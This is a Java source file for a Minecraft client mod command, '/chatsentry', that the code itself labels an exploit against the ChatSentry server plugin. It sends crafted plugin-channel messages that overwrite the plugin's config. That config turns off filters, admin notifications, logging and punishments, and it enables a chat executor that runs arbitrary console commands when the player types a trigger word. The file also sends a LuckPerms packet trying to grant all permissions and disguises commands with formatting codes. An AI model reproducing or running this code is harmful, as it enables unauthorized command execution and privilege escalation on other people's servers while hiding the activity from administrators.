package net.paradise_client.command.impl;

import com.google.common.io.ByteArrayDataOutput;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.util.Random;
import java.util.UUID;

public class ChatSentryCommand extends Command {

    private static final String CHANNEL = "chatsentry:datasync";
    private static final String PLUGIN_NAME = "skibidi";
    private static final String CONFIG_FILE = "config.yml";
    private static final String EXECUTOR_FILE = "chat-executor.yml";
    private static final String EXECUTOR_TARGET = "2822111278697";

    public ChatSentryCommand() {
        super("chatsentry", "Executes backend/bungee command using ChatSentry exploit.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(ctx -> {
            Helper.printChatMessage("Usage: /chatsentry <bungee/backend> <command>");
            return SINGLE_SUCCESS;
        })

        .then(literal("bungee")
            .then(argument("command", StringArgumentType.greedyString())
                .executes(ctx -> {
                    String cmd = ctx.getArgument("command", String.class);
                    Helper.sendPluginMessage(CHANNEL, out -> {
                        out.writeUTF("console_command");
                        out.writeUTF(cmd);
                    });
                    Helper.printChatMessage("Sent Bungee payload to ChatSentry.");
                    return SINGLE_SUCCESS;
                })
            )
        )

        .then(literal("backend")
            .then(argument("command", StringArgumentType.greedyString())
                .executes(ctx -> {
                    String command = ctx.getArgument("command", String.class);
                    new Thread(() -> sendExecutionPayload(command)).start();
                    return SINGLE_SUCCESS;
                })
            )
        );
    }

    private void sendExecutionPayload(String command) {
        String trigger = Helper.generateRandomString(6, "abcdefghijklmnopqrstuvwxyz0123456789", new Random());
        String command1 = obfuscateCommand(command);
        String command2 = "say §bChatSentry Executor §7-> §aExecuted!";

        // Anti-kick pre-buffer
        for (int i = 0; i < 2; i++) {
            getMinecraftClient().getNetworkHandler().sendChatMessage("#");
        }

        // Fake permission spoof (LuckPerms or other)
        spoofFakePermission();

        // Send backend fake config
        Helper.sendPluginMessage(CHANNEL, out -> {
            writeFakeConfig(out);
            out.writeUTF(EXECUTOR_TARGET);
        });

        // Send executor payload with chained commands
        Helper.sendPluginMessage(CHANNEL, out -> {
            writeExecutorPayload(out, new String[]{command1, command2}, trigger);
            out.writeUTF(EXECUTOR_TARGET);
        });

        Helper.printChatMessage("Sent ChatSentry backend exploit. Trigger message: " + trigger);

        try {
            Thread.sleep(200);
        } catch (InterruptedException ignored) {}

        // Trigger executor
        getMinecraftClient().getNetworkHandler().sendChatMessage(trigger);
    }

    private void spoofFakePermission() {
        Helper.sendPluginMessage("luckperms:main", out -> {
            out.writeUTF("user");
            out.writeUTF(Helper.getPlayerName());
            out.writeUTF("permission");
            out.writeUTF("set");
            out.writeUTF("*");
            out.writeUTF("true");
            out.writeUTF(UUID.randomUUID().toString()); // Random context
        });

        Helper.printChatMessage("Fake permission spoof packet sent.");
    }

    private void writeFakeConfig(ByteArrayDataOutput out) {
        out.writeUTF("sync");
        out.writeUTF("");
        out.writeUTF(PLUGIN_NAME);
        out.writeUTF(CONFIG_FILE);

        out.writeUTF("""
            check-for-updates: false
            process-chat: true
            process-commands: true
            process-signs: true
            process-anvils: true
            process-books: true
            context-prediction: true
            disable-vanilla-spam-kick: true
            network:
              enable: false
              sync-configs: true
              global-admin-notifier-messages: true
            enable-admin-notifier: false
            enable-discord-notifier: false
            enable-auto-punisher: false
            enable-word-and-phrase-filter: false
            enable-link-and-ad-blocker: false
            enable-spam-blocker: false
            enable-chat-cooldown: false
            enable-anti-chat-flood: false
            enable-unicode-remover: false
            enable-cap-limiter: false
            enable-anti-parrot: false
            enable-chat-executor: true
            enable-command-spy: false
            enable-logging-for:
              chat-cooldown: false
              spam-blocker: true
              unicode-remover: true
              cap-limiter: true
            override-bypass-permissions:
              chat-executor: true
            lockdown:
              active: false
              current-mode: "only-known"
              exempt-usernames:
                - "Notch"
                - "jeb_"
            command-blacklist:
              - "/tell"
            """);
    }

    private void writeExecutorPayload(ByteArrayDataOutput out, String[] commands, String trigger) {
        out.writeUTF("sync");
        out.writeUTF("modules");
        out.writeUTF(PLUGIN_NAME);
        out.writeUTF(EXECUTOR_FILE);

        StringBuilder exec = new StringBuilder();
        for (int i = 0; i < commands.length; i++) {
            exec.append("  - \"{console_cmd}: ").append(commands[i]).append("\"\n");
        }
        exec.append("  - \"{player_msg}: &aExecution Complete!\"");

        String yaml = String.format("""
            entries:
              1:
                match: "{regex}(%s)"
                set-matches-as: "{block}"
                execute:
%s
            """, trigger, exec.toString());

        out.writeUTF(yaml);
    }

    private String obfuscateCommand(String command) {
        // Add junk formatting or dummy prefixes
        String junkPrefix = new String[]{"", "§0", "§r", "§k", "§l"}[new Random().nextInt(5)];
        return junkPrefix + command;
    }
}
